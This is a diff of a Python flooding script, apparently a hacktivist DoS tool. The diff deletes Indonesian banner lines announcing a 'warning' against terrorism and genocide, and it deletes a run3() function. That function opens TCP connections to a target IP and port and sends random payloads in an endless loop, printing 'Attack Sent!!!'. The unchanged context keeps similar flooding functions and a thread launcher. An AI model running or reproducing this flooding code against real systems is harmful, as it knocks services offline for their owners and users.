@@ -46,17 +46,6 @@ threads = int(input("\033[37m Threads :\033[0m"))
 
 time.sleep(5),
 print("\033[33m  ⟩⟩  KALA DUNIA DIAM \033[0m "),
-time.sleep(5),
-print("\033[32m  ⟩⟩  DENGAN SEGALA BENTUK \033[0m "),
-time.sleep(5),
-print("\033[91m  ⟩⟩  TERORISME \033[0m "),
-time.sleep(5),
-print("\033[98m  ⟩⟩  DAN GENOSIDA \033[0m "),
-time.sleep(5),
-print("\033[96m  ⟩⟩  KAMI BANGKIT \033[0m "),
-time.sleep(5),
-print("\033[95m  ⟩⟩  MEMBERIKAN PERINGATAN...!! \033[0m "),
-time.sleep(5),
 
 def run():
 	data = random._urandom(1024)
@@ -89,20 +78,6 @@ def run2():
 			print("[-]  \033[31mMay be down\033[0m")
 
 
-def run3():
-	data = random._urandom(818)
-	i = random.choice(("[+]","[*]","[!]","[-]"))
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print("[+]  \033[94mAttack Sent!!!\033[0m")
-		except:
-			s.close()
-			print("[-]  \033[31mMay be down\033[0m")
 
 			
 for y in range(threads):
